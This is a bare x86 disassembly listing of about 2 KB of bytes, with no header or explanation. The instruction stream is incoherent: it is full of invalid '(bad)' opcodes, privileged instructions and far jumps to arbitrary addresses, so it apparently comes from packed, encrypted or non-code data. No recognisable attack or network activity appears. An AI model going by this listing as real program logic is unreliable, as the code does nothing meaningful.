  41e3a7:	shl    DWORD PTR [ebp-0x5f],0xd3
  41e3ab:	xor    al,0x4
  41e3ad:	pop    eax
  41e3ae:	mov    ebp,0x9bd93ac3
  41e3b3:	retf   
  41e3b4:	add    BYTE PTR [ebx-0x476fbc1],dh
  41e3ba:	mov    al,cs:0x3872e36f
  41e3c0:	xchg   ebp,eax
  41e3c1:	pop    ebp
  41e3c2:	inc    ebp
  41e3c3:	popf   
  41e3c4:	js     0x41e3d1
  41e3c6:	sub    ecx,0x68
  41e3c9:	jmp    0xc3c50d18
  41e3ce:	aaa    
  41e3cf:	lds    esi,FWORD PTR [ecx+edi*4-0x3d]
  41e3d3:	mov    edx,0xc58d3f81
  41e3d8:	pop    ebp
  41e3d9:	(bad)  
  41e3da:	icebp  
  41e3db:	cli    
  41e3dc:	pushf  
  41e3dd:	cdq    
  41e3de:	loope  0x41e361
  41e3e0:	push   esp
  41e3e1:	aam    0x45
  41e3e3:	fs sub eax,0x9514dba2
  41e3e9:	push   cs
  41e3ea:	ins    DWORD PTR es:[edi],dx
  41e3eb:	xchg   edi,eax
  41e3ec:	repnz cmp dl,BYTE PTR [esi]
  41e3ef:	sbb    al,0x91
  41e3f2:	ficomp DWORD PTR [edx-0x1af9f496]
  41e3f8:	cs jo  0x41e3bc
  41e3fb:	test   al,0x9c
  41e3fd:	mov    ah,0x3f
  41e3ff:	and    esp,DWORD PTR [ebx]
  41e401:	fwait
  41e402:	adc    eax,0xc238ece5
  41e407:	inc    ebx
  41e408:	fmul   DWORD PTR [ebp+0x1b1337be]
  41e40e:	pusha  
  41e40f:	sahf   
  41e410:	mov    cl,0x98
  41e412:	into   
  41e413:	adc    bl,al
  41e415:	cwde   
  41e416:	jg     0x41e3d7
  41e418:	iret   
  41e419:	cmp    eax,0x8b9892e7
  41e41e:	aaa    
  41e41f:	repz or edx,ebp
  41e422:	stos   DWORD PTR es:[edi],eax
  41e423:	mov    edi,esi
  41e425:	lahf   
  41e426:	adc    al,0x1
  41e428:	mov    esp,0x720ec37f
  41e42d:	sti    
  41e42e:	mov    bl,0x29
  41e430:	cmp    ch,BYTE PTR [eax+0x4]
  41e433:	xor    dh,BYTE PTR [eax+0x4a442e43]
  41e439:	xor    BYTE PTR ds:0x6317ac82,bh
  41e43f:	or     edi,esp
  41e441:	sbb    BYTE PTR [ecx+0x64e88e29],dh
  41e447:	loop   0x41e3e2
  41e449:	jno    0x41e3e7
  41e44b:	sbb    al,0xbe
  41e44d:	push   ds
  41e44e:	jns    0x41e3f4
  41e450:	dec    esp
  41e451:	fsub   DWORD PTR [edi]
  41e453:	arpl   WORD PTR [ebx-0x7251f659],si
  41e459:	mov    bl,0x2c
  41e45b:	sbb    DWORD PTR [esi+0x12e4cf06],0xffffffe1
  41e462:	inc    BYTE PTR [edx-0x20]
  41e465:	and    ch,cl
  41e467:	lods   al,BYTE PTR ds:[esi]
  41e468:	jp     0x41e4d8
  41e46a:	and    al,0xf9
  41e46c:	imul   esi,DWORD PTR [ecx-0x788c5f4],0x67
  41e473:	pop    esi
  41e474:	dec    edx
  41e475:	sub    dl,0x67
  41e478:	mov    cl,0x6f
  41e47a:	push   es
  41e47b:	outs   dx,BYTE PTR ds:[esi]
  41e47c:	fist   WORD PTR [edx]
  41e47e:	sub    cl,BYTE PTR [edi]
  41e480:	daa    
  41e481:	lea    edi,[ebx+0x4104050f]
  41e487:	jno    0x41e493
  41e489:	popa   
  41e48a:	add    al,0x9a
  41e48c:	push   edx
  41e48d:	test   BYTE PTR [edx+esi*8],al
  41e490:	stc    
  41e491:	dec    esi
  41e492:	fidivr DWORD PTR [edi+0x4af02914]
  41e498:	or     dh,al
  41e49a:	(bad)  
  41e49b:	cli    
  41e49c:	pop    es
  41e49d:	(bad)  
  41e49e:	xchg   esi,eax
  41e49f:	jmp    0x1eff680a
  41e4a4:	fdivp  st(2),st
  41e4a6:	shl    ch,cl
  41e4a8:	push   edi
  41e4a9:	setbe  dh
  41e4ac:	ror    BYTE PTR [edx],cl
  41e4ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4af:	ret    0xa224
  41e4b2:	clc    
  41e4b3:	jp     0x41e4c2
  41e4b5:	add    DWORD PTR [edx+0x2d81e997],eax
  41e4bb:	(bad)  
  41e4bc:	(bad)  
  41e4bd:	mov    BYTE PTR [ebx+0x22a92cbc],bh
  41e4c3:	bound  esp,QWORD PTR [eax-0x713d43d1]
  41e4c9:	fdiv   DWORD PTR [esi]
  41e4cb:	push   esi
  41e4cc:	xchg   BYTE PTR [edx-0x23],ah
  41e4cf:	xor    al,0xa3
  41e4d1:	mov    bh,0xeb
  41e4d3:	jnp    0x41e48d
  41e4d5:	scas   al,BYTE PTR es:[edi]
  41e4d6:	dec    ecx
  41e4d7:	xchg   esp,eax
  41e4d8:	pop    ecx
  41e4d9:	xchg   edx,eax
  41e4da:	cmp    al,0xee
  41e4dc:	inc    eax
  41e4dd:	adc    DWORD PTR ss:[edx-0x4e870ff6],ebx
  41e4e4:	retf   
  41e4e5:	push   0xffffff91
  41e4e7:	aad    0x22
  41e4e9:	fdivr  DWORD PTR [ecx+0x2f39ba76]
  41e4ef:	and    al,0xae
  41e4f1:	dec    eax
  41e4f2:	xor    ebx,DWORD PTR [ecx-0x3d677023]
  41e4f8:	dec    edi
  41e4f9:	inc    eax
  41e4fa:	sbb    eax,0x85b1b710
  41e4ff:	inc    esi
  41e500:	std    
  41e501:	add    esi,ecx
  41e503:	les    esi,FWORD PTR [esi-0x39796b28]
  41e509:	in     eax,0x91
  41e50b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e50c:	in     eax,0x25
  41e50e:	inc    esi
  41e50f:	icebp  
  41e510:	js     0x41e4fc
  41e512:	shr    BYTE PTR [ecx-0x36fe175b],0x93
  41e519:	stos   DWORD PTR es:[edi],eax
  41e51a:	imul   ebp,DWORD PTR [ebx+0x611be678],0x67140c1d
  41e524:	lods   eax,DWORD PTR ds:[esi]
  41e525:	xor    al,BYTE PTR [eax-0x489ecb17]
  41e52b:	mov    eax,ds:0x1b4f3e8c
  41e530:	test   ah,0x9e
  41e533:	js     0x41e55b
  41e535:	nop
  41e536:	or     ecx,ebx
  41e538:	adc    al,0xba
  41e53a:	in     eax,dx
  41e53b:	push   eax
  41e53c:	add    cl,ah
  41e53e:	add    eax,0x1da41494
  41e543:	popf   
  41e544:	rol    BYTE PTR [edi-0x4b],cl
  41e547:	jb     0x41e563
  41e549:	sti    
  41e54a:	sbb    eax,0x7da2cf6d
  41e54f:	(bad)  
  41e551:	cmp    al,dl
  41e553:	push   ecx
  41e554:	jo     0x41e582
  41e556:	xor    eax,0xbe411e84
  41e55b:	sub    cl,ah
  41e55d:	test   eax,0x4f488c6c
  41e562:	cmp    BYTE PTR [ebx],bh
  41e564:	xchg   BYTE PTR [ebx-0x46],cl
  41e567:	scas   al,BYTE PTR es:[edi]
  41e568:	mov    ah,0x74
  41e56a:	and    al,0xc6
  41e56c:	iret   
  41e56d:	and    BYTE PTR [esi+0x6ce9fca3],0x2b
  41e574:	sub    DWORD PTR [esi],ebx
  41e576:	lahf   
  41e577:	jbe    0x41e5bb
  41e579:	mov    cl,0xea
  41e57b:	sbb    dl,BYTE PTR ds:0x49424d2a
  41e581:	adc    bl,BYTE PTR [ecx]
  41e583:	dec    ebx
  41e584:	loopne 0x41e601
  41e586:	and    esi,DWORD PTR [ecx-0x7b7c20cc]
  41e58c:	or     BYTE PTR [edx+0x7e],cl
  41e58f:	inc    ecx
  41e590:	sbb    al,0x9
  41e592:	ins    DWORD PTR es:[edi],dx
  41e593:	imul   ecx,DWORD PTR [ebx-0x39],0x24
  41e597:	hlt    
  41e598:	enter  0x806c,0x2a
  41e59c:	leave  
  41e59d:	add    BYTE PTR [ebx],dh
  41e59f:	mov    cl,0x99
  41e5a1:	lock ficom WORD PTR [ebp+0x29088657]
  41e5a8:	push   ds
  41e5a9:	sti    
  41e5aa:	or     DWORD PTR [ebx],edi
  41e5ac:	(bad)  
  41e5ad:	arpl   WORD PTR [ebp+0x25268cdd],sp
  41e5b3:	xabort 0xad
  41e5b6:	dec    edi
  41e5b7:	cld    
  41e5b8:	push   edi
  41e5b9:	jle    0x41e564
  41e5bb:	ret    0x5ed5
  41e5be:	outs   dx,BYTE PTR ds:[esi]
  41e5bf:	icebp  
  41e5c0:	sub    ebx,esi
  41e5c2:	call   0x4821:0x91afce88
  41e5c9:	rcl    BYTE PTR [ecx+0x73],cl
  41e5cc:	xor    eax,0xb7e689af
  41e5d1:	int3   
  41e5d2:	dec    eax
  41e5d3:	inc    esp
  41e5d4:	cmp    ah,BYTE PTR [esp+edx*4]
  41e5d7:	jge    0x41e5a3
  41e5d9:	shl    ebx,1
  41e5db:	les    ebp,FWORD PTR [esi+edi*1+0x6b]
  41e5df:	and    BYTE PTR [ebp-0x24c4068],0x4
  41e5e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5e7:	(bad)  
  41e5e8:	sti    
  41e5e9:	aaa    
  41e5ea:	cdq    
  41e5eb:	mov    cl,0xc7
  41e5ed:	xchg   ebp,eax
  41e5ee:	jmp    0x6379:0x4e80f8db
  41e5f5:	pop    ss
  41e5f6:	gs inc edx
  41e5f8:	les    esp,FWORD PTR [eax]
  41e5fa:	mov    eax,0xf2a382f6
  41e5ff:	enter  0x92a1,0x67
  41e603:	inc    esi
  41e604:	fisttp QWORD PTR [edi+0x10]
  41e607:	mov    dh,0xfe
  41e609:	(bad)  
  41e60a:	sbb    DWORD PTR ds:0xed21b308,esi
  41e610:	cmp    al,0x3f
  41e612:	mov    bh,0x73
  41e614:	gs add al,0x2
  41e617:	mov    ?,WORD PTR [edi]
  41e619:	std    
  41e61a:	mov    dl,0x5c
  41e61c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e61d:	scas   eax,DWORD PTR es:[edi]
  41e61e:	out    dx,eax
  41e61f:	rcl    dl,cl
  41e621:	jae    0x41e5c8
  41e623:	out    0x4e,eax
  41e625:	pop    esp
  41e626:	push   ebp
  41e627:	outs   dx,DWORD PTR ds:[esi]
  41e628:	(bad)  
  41e629:	imul   edx,DWORD PTR [edi],0x25
  41e62c:	inc    ecx
  41e62d:	or     BYTE PTR [edx+edi*8+0x5],dh
  41e631:	pusha  
  41e632:	push   ecx
  41e633:	sub    bh,BYTE PTR [ebp+esi*1+0x46]
  41e637:	in     al,dx
  41e638:	inc    ecx
  41e639:	or     DWORD PTR [ebp+0x348097ad],edx
  41e63f:	sahf   
  41e640:	jne    0x41e61d
  41e642:	inc    esp
  41e643:	and    eax,0x793365a5
  41e648:	inc    edi
  41e649:	bound  esp,QWORD PTR [ebp+0x7eacbc08]
  41e64f:	cmp    BYTE PTR [esp+eax*8-0x2edbe10c],cl
  41e656:	push   edi
  41e657:	out    0xe8,al
  41e659:	loope  0x41e627
  41e65b:	or     dl,BYTE PTR [ebx]
  41e65d:	inc    ecx
  41e65e:	shr    BYTE PTR [ebx+0x47025f97],cl
  41e664:	inc    eax
  41e665:	fwait
  41e666:	push   0x7d9e9546
  41e66b:	sbb    DWORD PTR [ecx],0xc4d9ee36
  41e671:	xlat   BYTE PTR ds:[ebx]
  41e672:	add    eax,0xcb65e77f
  41e677:	and    DWORD PTR [edx+0x69],ebx
  41e67a:	pop    eax
  41e67b:	pushf  
  41e67c:	mov    bl,0x45
  41e67e:	sbb    BYTE PTR [edx-0x63],bh
  41e681:	dec    ebx
  41e682:	rcr    DWORD PTR [ebx+eiz*2],cl
  41e685:	sbb    ecx,DWORD PTR [esi-0xe74cf7a]
  41e68b:	push   ebp
  41e68c:	dec    ebp
  41e68d:	or     DWORD PTR [ecx],0x1a
  41e690:	jg     0x41e68b
  41e692:	add    ecx,ebp
  41e694:	xchg   ebp,eax
  41e695:	hlt    
  41e696:	xchg   ecx,eax
  41e697:	stos   BYTE PTR es:[edi],al
  41e698:	sahf   
  41e699:	or     ebx,edi
  41e69b:	and    DWORD PTR [ebp+0x39],esp
  41e69e:	nop
  41e69f:	push   0xffffff96
  41e6a1:	mov    esi,0xdda88cc4
  41e6a6:	mov    ebx,0xd336635c
  41e6ab:	dec    esi
  41e6ac:	push   edx
  41e6ad:	or     al,0xa
  41e6af:	add    edi,DWORD PTR [esi+0x69]
  41e6b2:	sub    ch,BYTE PTR [esi]
  41e6b4:	sti    
  41e6b5:	pop    ebx
  41e6b6:	int3   
  41e6b7:	into   
  41e6b8:	sbb    al,0x82
  41e6ba:	xchg   dh,ch
  41e6bc:	jl     0x41e6b9
  41e6be:	call   0xbd7f:0xab704f1f
  41e6c5:	and    eax,0x829a7d66
  41e6ca:	mov    BYTE PTR [ebx-0x7c81bb60],dl
  41e6d0:	mov    es,ebp
  41e6d2:	push   cs
  41e6d3:	and    eax,edi
  41e6d5:	leave  
  41e6d6:	add    BYTE PTR fs:[eax],0x0
  41e6da:	add    BYTE PTR [eax],al
  41e6dc:	add    BYTE PTR [eax],al
  41e6de:	add    BYTE PTR [eax],al
  41e6e0:	add    BYTE PTR ds:0xfffb5fc4,ch
  41e6e6:	sti    
  41e6e7:	lods   eax,DWORD PTR ds:[esi]
  41e6e8:	(bad)  
  41e6e9:	or     DWORD PTR [edi],ebp
  41e6eb:	jmp    0x78fa75d
  41e6f0:	stos   DWORD PTR es:[edi],eax
  41e6f1:	bound  esp,QWORD PTR [edx+0x1]
  41e6f4:	add    BYTE PTR [edi-0x5cfffffd],ch
  41e6fa:	cmc    
  41e6fb:	or     dl,al
  41e6fd:	jae    0x41e6dc
  41e6ff:	repnz out 0x35,eax
  41e702:	scas   eax,DWORD PTR es:[edi]
  41e703:	ins    BYTE PTR es:[edi],dx
  41e704:	loop   0x41e711
  41e706:	xor    ch,BYTE PTR [esi-0x6b]
  41e709:	mov    ds:0x1da8ee48,eax
  41e70e:	dec    eax
  41e70f:	push   edx
  41e710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e711:	mov    ah,0x21
  41e713:	stc    
  41e714:	iret   
  41e715:	jno    0x41e744
  41e717:	fs gs jmp 0x290a8e01
  41e71e:	inc    edx
  41e71f:	out    0xb1,al
  41e721:	adc    esi,DWORD PTR [esi+0x7261783]
  41e727:	mov    ss,edi
  41e729:	cli    
  41e72a:	xchg   esi,eax
  41e72b:	dec    ebp
  41e72c:	inc    ebp
  41e72d:	sbb    cl,BYTE PTR [ecx+0x73]
  41e730:	mov    bh,0x2c
  41e732:	dec    ebx
  41e733:	cmp    eax,0x73cbdf02
  41e738:	rcr    BYTE PTR [ebp+0x38bd550d],cl
  41e73e:	fwait
  41e73f:	ret    
  41e740:	xchg   ebx,eax
  41e741:	cld    
  41e742:	int    0x7d
  41e744:	in     al,dx
  41e745:	xlat   BYTE PTR ds:[ebx]
  41e746:	xor    DWORD PTR [edx+edi*1+0x5efe6399],edi
  41e74d:	ret    0xeab6
  41e750:	mov    cl,0x4d
  41e752:	add    esp,DWORD PTR [edi+ecx*8-0x59]
  41e756:	call   0xc85e41e7
  41e75b:	xchg   edi,eax
  41e75c:	hlt    
  41e75d:	ds mov ch,0xbf
  41e760:	or     DWORD PTR [ecx-0x26b1d2cd],edi
  41e766:	push   edx
  41e767:	ror    BYTE PTR [edi-0x3b],0xb8
  41e76b:	jle    0x41e73d
  41e76d:	sub    BYTE PTR [edx-0x2b8bf6b],dl
  41e773:	test   eax,0xb79f4229
  41e778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e779:	(bad)  
  41e77a:	push   ecx
  41e77b:	pop    ds
  41e77c:	dec    ebx
  41e77d:	mov    bl,0x2b
  41e77f:	inc    ebx
  41e780:	mov    esp,0x3c6ed7f7
  41e785:	lock pop ds
  41e787:	(bad)  
  41e788:	aad    0xcf
  41e78a:	dec    ebx
  41e78b:	add    esp,esp
  41e78d:	jl     0x41e75c
  41e78f:	xor    al,0x4b
  41e791:	out    dx,eax
  41e792:	enter  0xe448,0xc4
  41e796:	xor    BYTE PTR [ecx+0x55e63a6b],bl
  41e79c:	mov    ch,0x37
  41e79e:	add    ebx,edi
  41e7a0:	sahf   
  41e7a1:	pop    ebp
  41e7a2:	sahf   
  41e7a3:	push   ecx
  41e7a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7a5:	aam    0xfd
  41e7a7:	jno    0x41e73e
  41e7a9:	or     ebx,eax
  41e7ab:	icebp  
  41e7ac:	or     DWORD PTR [eax+0xa],0x21
  41e7b0:	xor    al,0x4e
  41e7b2:	mov    ebp,0x7d893960
  41e7b7:	jbe    0x41e791
  41e7b9:	dec    edi
  41e7ba:	add    dl,ch
  41e7bc:	dec    edx
  41e7bd:	mov    eax,0x45c4ca4b
  41e7c2:	mov    dl,0x36
  41e7c4:	call   0xc10ad57b
  41e7c9:	mov    eax,ds:0x6690c0c8
  41e7ce:	cs jg  0x41e7b9
  41e7d1:	hlt    
  41e7d2:	xor    al,0x2a
  41e7d4:	push   DWORD PTR [ebx-0x657cd6b2]
  41e7da:	inc    esp
  41e7db:	add    DWORD PTR [edi-0x67],esp
  41e7de:	fidiv  WORD PTR [edx-0x3f]
  41e7e1:	out    0xa5,eax
  41e7e3:	push   edi
  41e7e4:	stos   BYTE PTR es:[edi],al
  41e7e5:	outs   dx,BYTE PTR ds:[esi]
  41e7e6:	push   0x1ea80b67
  41e7eb:	cmp    DWORD PTR [ebx-0x46],eax
  41e7ee:	jae    0x41e869
  41e7f0:	jb     0x41e7ad
  41e7f2:	mov    ebx,0xd1082c9b
  41e7f7:	adc    ecx,DWORD PTR [edx+0x53825959]
  41e7fd:	iret   
  41e7fe:	mov    esp,0x23543e23
  41e803:	retf   0x2cd1
  41e806:	pop    ebp
  41e807:	push   ecx
  41e808:	(bad)  
  41e809:	das    
  41e80a:	pop    ss
  41e80b:	stos   DWORD PTR es:[edi],eax
  41e80c:	outs   dx,DWORD PTR ds:[esi]
  41e80d:	fbstp  TBYTE PTR [ebx+ebp*8]
  41e810:	loopne 0x41e875
  41e812:	xchg   DWORD PTR [edx-0x4b],esi
  41e815:	call   0x1d442758
  41e81a:	les    ebx,FWORD PTR [eax-0x3bf80d0b]
  41e820:	or     DWORD PTR [eax],eax
  41e822:	mov    DWORD PTR [edx+ebx*4],esp
  41e825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e826:	mov    ebx,0xcb1372c3
  41e82b:	outs   dx,BYTE PTR ds:[esi]
  41e82c:	jmp    DWORD PTR [ebx-0x5]
  41e82f:	jb     0x41e885
  41e831:	enter  0xfc72,0x27
  41e835:	icebp  
  41e836:	add    eax,0x98be7055
  41e83b:	repnz icebp 
  41e83d:	call   0xabccb958
  41e842:	sbb    eax,0x5817ab71
  41e847:	mov    cl,BYTE PTR [edi+0x5b]
  41e84a:	pop    esi
  41e84b:	mov    dh,0xdb
  41e84d:	jbe    0x41e813
  41e84f:	rcr    BYTE PTR [edi+eiz*4],0xa3
  41e853:	pop    ebx
  41e854:	and    ah,BYTE PTR [ebp+0x59d38beb]
  41e85a:	jae    0x41e858
  41e85c:	fcmovb st,st(0)
  41e85e:	das    
  41e85f:	or     ch,BYTE PTR [eax+0x29]
  41e862:	sub    eax,ebp
  41e864:	mov    esi,0x647c76b
  41e869:	adc    bl,BYTE PTR [ecx-0xa]
  41e86c:	pop    ecx
  41e86d:	mov    ebx,0x35818023
  41e872:	rol    DWORD PTR [eax-0x58],cl
  41e875:	fdiv   DWORD PTR [edx-0xcaff0f7]
  41e87b:	mov    eax,0x721005d8
  41e880:	pop    eax
  41e881:	rol    al,1
  41e883:	jl     0x41e81a
  41e885:	jns    0x41e8dc
  41e887:	dec    esp
  41e888:	aaa    
  41e889:	ror    ch,cl
  41e88b:	jmp    0xe0db:0x846a6009
  41e892:	dec    edx
  41e893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e894:	xor    BYTE PTR [edi],0x23
  41e897:	(bad)  
  41e898:	shr    DWORD PTR [edx+0x360bce22],cl
  41e89e:	or     al,0xb0
  41e8a0:	mov    ebx,edx
  41e8a2:	(bad)  
  41e8a3:	outs   dx,DWORD PTR ds:[esi]
  41e8a4:	xor    bh,BYTE PTR [ecx-0x5f758e76]
  41e8aa:	sbb    DWORD PTR [edi-0x50],0xf8fc39de
  41e8b1:	movlhps xmm7,xmm7
  41e8b4:	dec    esp
  41e8b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8b6:	jo     0x41e8ee
  41e8b8:	push   0x7cb818af
  41e8bd:	push   es
  41e8be:	adc    DWORD PTR [eax-0x57a23a67],edi
  41e8c4:	shl    BYTE PTR [edi+0x6c],cl
  41e8c7:	jmp    0x7579:0x7d4390b4
  41e8ce:	jne    0x41e898
  41e8d0:	sbb    eax,0x7f7ab523
  41e8d5:	push   esi
  41e8d6:	stc    
  41e8d7:	cmc    
  41e8d8:	imul   ebx,DWORD PTR [edx+0x5fd62f11],0xffffffb7
  41e8df:	out    0x8f,eax
  41e8e1:	lea    ebp,ds:0xae8eb374
  41e8e7:	push   ds
  41e8e8:	cmp    eax,DWORD PTR [esi]
  41e8ea:	xchg   esi,eax
  41e8eb:	dec    edx
  41e8ec:	ins    DWORD PTR es:[edi],dx
  41e8ed:	adc    esi,0xffffffdf
  41e8f0:	or     BYTE PTR [ecx-0x1f290c8d],0x6f
  41e8f7:	frstor [ecx-0x3fd24728]
  41e8fd:	fdivr  QWORD PTR [ebx-0x77]
  41e900:	mov    edi,0x4579796f
  41e905:	clc    
  41e906:	inc    eax
  41e907:	sub    dh,BYTE PTR [eax]
  41e909:	and    al,0x6f
  41e90b:	cdq    
  41e90c:	es xchg ebp,eax
  41e90e:	mov    ebp,0xae64c7b4
  41e913:	inc    eax
  41e914:	mov    al,ds:0x6be285b2
  41e919:	sbb    eax,esi
  41e91b:	inc    edi
  41e91c:	cmp    DWORD PTR [ecx+0x4b],ecx
  41e91f:	mov    bl,0xc1
  41e921:	int    0x2e
  41e923:	jle    0x41e8b8
  41e925:	out    dx,eax
  41e926:	cmp    ch,BYTE PTR [esi+0x84889b8]
  41e92c:	mov    al,0x8d
  41e92e:	nop
  41e92f:	ss stos DWORD PTR es:[edi],eax
  41e931:	mov    al,0xb4
  41e933:	ins    BYTE PTR es:[edi],dx
  41e934:	je     0x41e999
  41e936:	icebp  
  41e937:	scas   al,BYTE PTR es:[edi]
  41e938:	push   edi
  41e939:	sbb    BYTE PTR [edi-0x5f8a6bd7],0x71
  41e940:	add    BYTE PTR ds:0x417e96ab,al
  41e946:	lods   eax,DWORD PTR ds:[esi]
  41e947:	sbb    DWORD PTR [ebx],esi
  41e949:	int    0x28
  41e94b:	xchg   esi,eax
  41e94c:	and    BYTE PTR [eax+0x7f],bl
  41e94f:	xchg   ebp,eax
  41e950:	sub    ecx,0x34
  41e953:	sar    dl,cl
  41e955:	xor    dh,ch
  41e957:	scas   al,BYTE PTR es:[edi]
  41e958:	cdq    
  41e959:	mov    eax,0xa251c203
  41e95e:	xor    BYTE PTR [edx+0x6a6a598a],bl
  41e964:	pop    edi
  41e965:	sbb    esi,esi
  41e967:	cmp    DWORD PTR [edi-0x68],edx
  41e96a:	rcr    bl,1
  41e96c:	or     DWORD PTR [ecx-0x23f9ff08],esi
  41e972:	out    0xe7,al
  41e974:	jno    0x41e912
  41e976:	and    ah,BYTE PTR [ebx]
  41e978:	mov    esi,0x3f8ef358
  41e97d:	or     DWORD PTR [edx],0x7e
  41e980:	sar    DWORD PTR [edi-0x24],0x12
  41e984:	push   edi
  41e985:	not    DWORD PTR [edx]
  41e987:	or     eax,0x96f8237
  41e98c:	push   edi
  41e98d:	dec    ebx
  41e98e:	mov    cl,0x67
  41e990:	shl    ch,0x3a
  41e993:	ins    DWORD PTR es:[edi],dx
  41e994:	pop    ds
  41e995:	cmc    
  41e996:	sub    al,0x8b
  41e998:	jmp    0x406:0x435ed81a
  41e99f:	retf   
  41e9a0:	into   
  41e9a1:	sub    ebx,0xffffffa4
  41e9a4:	(bad)  
  41e9a5:	inc    esi
  41e9a6:	js     0x41e9c4
  41e9a8:	sbb    eax,0x76a111fa
  41e9ad:	mov    ds:0xf3c8f1b7,al
  41e9b2:	push   es
  41e9b3:	ja     0x41ea30
  41e9b5:	mov    al,0xc5
  41e9b7:	cmp    al,0x99
  41e9b9:	out    0xe3,al
  41e9bb:	mov    bl,0x24
  41e9bd:	in     eax,0x6f
  41e9bf:	xchg   ebx,eax
  41e9c0:	imul   eax,eax,0x5d
  41e9c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9c4:	scas   eax,DWORD PTR es:[edi]
  41e9c5:	(bad)  
  41e9c6:	xor    DWORD PTR [edx-0x3d],edx
  41e9c9:	jmp    0xe2f7:0xbddeab6a
  41e9d0:	into   
  41e9d1:	xor    DWORD PTR [edi],esi
  41e9d3:	bound  edx,QWORD PTR fs:[edi+0x13e39ea9]
  41e9da:	cmp    ebp,esi
  41e9dc:	je     0x41e9fe
  41e9de:	cmp    ecx,DWORD PTR [edi+0x2bd5e12d]
  41e9e4:	xor    bx,WORD PTR [esi+0x5f55f962]
  41e9eb:	mov    ebx,0x695484e2
  41e9f0:	leave  
  41e9f1:	inc    ebx
  41e9f2:	arpl   WORD PTR [ecx],dx
  41e9f4:	add    al,0xff
  41e9f6:	jmp    0x41e982
  41e9f8:	push   ebx
  41e9f9:	test   al,0x6c
  41e9fb:	retf   0x5d44
  41e9fe:	call   0xa8e001ba
  41ea03:	lea    esp,[ecx]
  41ea05:	mov    dl,BYTE PTR [esi-0x14e89be9]
  41ea0b:	mov    edx,0x9478d940
  41ea10:	std    
  41ea11:	fcomp  DWORD PTR [ebx-0x35]
  41ea14:	arpl   WORD PTR [esi+0x62d288fc],sp
  41ea1a:	mov    ebx,DWORD PTR [ebp+0x28a617b3]
  41ea20:	pop    edx
  41ea21:	jo     0x41ea84
  41ea23:	stc    
  41ea24:	fstp   TBYTE PTR [edi]
  41ea26:	loope  0x41e9cc
  41ea28:	and    eax,DWORD PTR [edi-0x48223c42]
  41ea2e:	idiv   DWORD PTR [ebp-0x153f5e41]
  41ea34:	xor    bl,BYTE PTR [esi+esi*1]
  41ea37:	push   edx
  41ea38:	fs push cs
  41ea3a:	adc    eax,0x89fbdd71
  41ea3f:	popa   
  41ea40:	fist   WORD PTR [ebx+0x22]
  41ea43:	cmp    dl,dl
  41ea45:	fs ret 0x893e
  41ea49:	xlat   BYTE PTR ds:[ebx]
  41ea4a:	push   ebx
  41ea4b:	push   ecx
  41ea4c:	cmp    DWORD PTR [esi+0x11],esi
  41ea4f:	fist   WORD PTR [edi]
  41ea51:	inc    eax
  41ea52:	push   cs
  41ea53:	iret   
  41ea54:	int3   
  41ea55:	dec    esi
  41ea56:	push   ebx
  41ea57:	dec    ecx
  41ea58:	mov    ecx,0xcf3dc2a6
  41ea5d:	icebp  
  41ea5e:	nop
  41ea5f:	outs   dx,DWORD PTR ds:[esi]
  41ea60:	das    
  41ea61:	lds    ebp,FWORD PTR [edx-0x65]
  41ea64:	cmp    esp,DWORD PTR [esi-0xccdb350]
  41ea6a:	ds dec ebx
  41ea6c:	add    BYTE PTR [ebx-0x43e28ec6],bl
  41ea72:	lods   eax,DWORD PTR ds:[esi]
  41ea73:	ret    0x74fe
  41ea76:	test   BYTE PTR [edi],dh
  41ea78:	jb     0x41eae7
  41ea7a:	dec    ebp
  41ea7b:	dec    ecx
  41ea7c:	mov    bh,BYTE PTR [esi+0x27]
  41ea7f:	sbb    eax,0xf8a896ce
  41ea84:	and    BYTE PTR [esi-0x4],dh
  41ea87:	or     BYTE PTR [eax-0x2b],0x72
  41ea8b:	jae    0x41eab7
  41ea8d:	clc    
  41ea8e:	push   ebx
  41ea8f:	or     BYTE PTR [eax+0x23],cl
  41ea92:	out    dx,eax
  41ea93:	inc    esi
  41ea94:	dec    ebp
  41ea95:	dec    edx
  41ea96:	out    0xca,al
  41ea98:	mov    ecx,0xdb1ae073
  41ea9d:	lods   eax,DWORD PTR ds:[esi]
  41ea9e:	shl    edi,cl
  41eaa0:	loopne 0x41ea27
  41eaa2:	daa    
  41eaa3:	fwait
  41eaa4:	or     eax,DWORD PTR [si+0x78]
	...
  41eab1:	jle    0x41ea75
  41eab3:	in     al,dx
  41eab4:	push   cs
  41eab5:	cld    
  41eab6:	cs (bad) 
  41eab8:	repnz lods eax,DWORD PTR ds:[esi]
  41eaba:	add    BYTE PTR [eax],bl
  41eabc:	xor    al,0x7
  41eabe:	dec    ebp
  41eabf:	fnstsw WORD PTR [ebx+0x16611]
  41eac5:	scas   eax,DWORD PTR es:[edi]
  41eac6:	add    eax,DWORD PTR [eax]
  41eac8:	add    BYTE PTR [edi+0x2deb91a3],bh
  41eace:	fst    DWORD PTR [ebp-0x1e]
  41ead1:	pushf  
  41ead2:	push   ebx
  41ead3:	inc    esp
  41ead4:	outs   dx,BYTE PTR ds:[esi]
  41ead5:	fist   DWORD PTR [edx-0x2dcccc23]
  41eadb:	in     al,0x82
  41eadd:	(bad)  
  41eade:	pusha  
  41eadf:	cmp    eax,0x8dc9f851
  41eae4:	sbb    eax,0x37c879d2
  41eae9:	fdiv   st,st(4)
  41eaeb:	mov    bl,0x7a
  41eaed:	sub    dh,dl
  41eaef:	fdivr  QWORD PTR [edi-0x44]
  41eaf2:	les    ebx,FWORD PTR [edi-0x69e66aff]
  41eaf8:	pop    edx
  41eaf9:	jbe    0x41eaa7
  41eafb:	sahf   
  41eafc:	pop    edi
  41eafd:	mov    edi,0x6e522d41
  41eb02:	loope  0x41eb17
  41eb04:	test   bh,dl
  41eb06:	or     eax,0x706816c2
  41eb0b:	jmp    0x41eb5d
  41eb0d:	dec    ecx
